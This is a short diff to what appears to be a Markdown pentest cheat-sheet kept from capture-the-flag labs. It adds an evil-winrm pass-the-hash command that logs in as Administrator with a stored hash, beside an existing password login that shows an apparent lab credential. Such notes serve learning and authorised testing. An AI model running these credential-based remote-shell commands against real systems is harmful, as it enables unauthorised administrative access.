@@ -18,6 +18,12 @@ evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
 ```
 Used on: **Overwatch**
 
+### Connect with Pass-the-Hash
+```bash
+evil-winrm -i $TARGET -u Administrator -H $(cat admin-hash.txt)
+```
+Used on: **AttacktiveDirectory**
+
 - `-i` — target IP
 - `-u` / `-p` — username / password
 
